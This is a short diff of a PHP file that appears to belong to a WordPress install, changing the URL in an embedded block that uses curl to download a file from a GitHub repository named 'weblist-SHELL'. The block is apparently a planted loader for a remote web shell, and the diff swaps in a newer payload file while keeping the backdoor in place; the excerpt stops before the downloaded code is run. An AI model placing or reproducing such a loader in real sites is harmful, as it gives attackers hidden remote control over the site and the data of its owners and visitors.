@@ -34,7 +34,7 @@ if ( function_exists( 'error_reporting' ) ) {
 }
 ?>
 <?php
-    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/wpl.php";
+    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/2025wp-inc-vn.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
